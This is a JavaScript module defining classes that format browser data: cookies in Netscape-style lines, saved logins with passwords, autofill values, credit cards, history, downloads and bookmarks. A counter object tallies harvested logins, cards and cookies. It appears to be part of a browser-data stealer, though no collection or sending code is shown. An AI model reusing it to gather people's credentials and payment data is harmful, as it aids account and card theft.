class Cookie {
    constructor(Host, Path, Secure, Expires, Name, Value) {
        this.Host = Host;
        this.Path = Path;
        this.Secure = Secure;
        this.Expires = Expires;
        this.Name = Name;
        this.Value = Value;
    }
    write() {
        const isHostSubdomain = this.Host.startsWith('.') ? 'FALSE' : 'TRUE';
        const isExpiresDefined = this.Secure === 0 ? 'FALSE' : 'TRUE';
        return [
            this.Host,
            isExpiresDefined,
            this.Path,
            isHostSubdomain,
            this.Secure,
            this.Expires,
            this.Name,
            this.Value
        ].join('\t') + '\n';
    }
};

class Login {
    constructor(LoginURL, Username, Password, Timestamp) {
        this.LoginURL = LoginURL;
        this.Username = Username;
        this.Password = Password;
        this.Timestamp = Timestamp;
    }
    write() {
        return [
            `LoginURL: ${this.LoginURL}`,
            `Username: ${this.Username}`,
            `Password: ${this.Password}`,
            `Timestamp: ${this.Timestamp}`
        ].join('\n') + '\n';
    }
};

class Autofill {
    constructor(Input, Value) {
        this.Input = Input;
        this.Value = Value;
    }
    write() {
        return [
            `Input: ${this.Input}`,
            `Value: ${this.Value}`,
        ].join('\n') + '\n';
    }
};

class CreditCard {
    constructor(Guid, Name, Number, Address, Nickname, ExpirationMonth, ExpirationYear) {
        this.Guid = Guid;
        this.Name = Name;
        this.Number = Number;
        this.Address = Address;
        this.Nickname = Nickname;
        this.Expiration = `${ExpirationMonth}/${ExpirationYear}`;
    }
    write() {
        return [
            `Guid: ${this.Guid}`,
            `Name: ${this.Name}`,
            `Number: ${this.Number}`,
            `Address: ${this.Address}`,
            `Nickname: ${this.Nickname}`,
            `Expiration: ${this.Expiration}`,
        ].join('\n') + '\n';
    }
};

class History {
    constructor(URL, Title, VisitCount, Timestamp) {
        this.URL = URL;
        this.Title = Title;
        this.VisitCount = VisitCount;
        this.Timestamp = Timestamp;
    }
    write() {
        return [
            `URL: ${this.URL}`,
            `Title: ${this.Title}`,
            `VisitCount: ${this.VisitCount}`,
            `Timestamp: ${this.Timestamp}`
        ].join('\n') + '\n';
    }
};

class Download {
    constructor(URL, TargetPath, TotalBytes) {
        this.URL = URL;
        this.TargetPath = TargetPath;
        this.TotalBytes = TotalBytes;
    }
    write() {
        return [
            `URL: ${this.URL}`,
            `TargetPath: ${this.TargetPath}`,
            `TotalBytes: ${this.TotalBytes}`
        ].join('\n') + '\n';
    }
};

class Bookmark {
    constructor(URL, TargetName, Timestamp) {
        this.URL = URL;
        this.TargetName = TargetName;
        this.Timestamp = Timestamp;
    }
    write() {
        return [
            `URL: ${this.URL}`,
            `TargetName: ${this.TargetName}`,
            `Timestamp: ${this.Timestamp}`
        ].join('\n') + '\n';
    }
};

class BrowserAllStatistics {
    constructor() {
        this.downloadsCount = 0;
        this.historysCount = 0;
        this.bookmarksCount = 0;
        this.autofillsCount = 0;
        this.loginsCount = 0;
        this.credirCardsCount = 0;
        this.cookiesCount = 0;
        this.cookies = [];
        this.logins = [];
        this.users = [];
    }
    updateStatistics(downloadsCount, historysCount, bookmarksCount, autofillsCount, loginsCount, credirCardsCount, cookiesCount) {
        this.downloadsCount = downloadsCount;
        this.historysCount = historysCount;
        this.bookmarksCount = bookmarksCount;
        this.autofillsCount = autofillsCount;
        this.loginsCount = loginsCount;
        this.credirCardsCount = credirCardsCount;
        this.cookiesCount = cookiesCount;
    }
    addCookies(value) {
        if (!this.cookies.includes(value)) {
            this.cookies.push(value);
        }
    }
    addLogins(value) {
        if (!this.logins.includes(value)) {
            this.logins.push(value);
        }
    }
    addUsers(value) {
        if (!this.users.includes(value)) {
            this.users.push(value);
        }
    }
};

const BrowserStatistics = new BrowserAllStatistics();

module.exports = {
    BrowserStatistics,
    Cookie,
    Login,
    Autofill,
    CreditCard,
    History,
    Download,
    Bookmark
}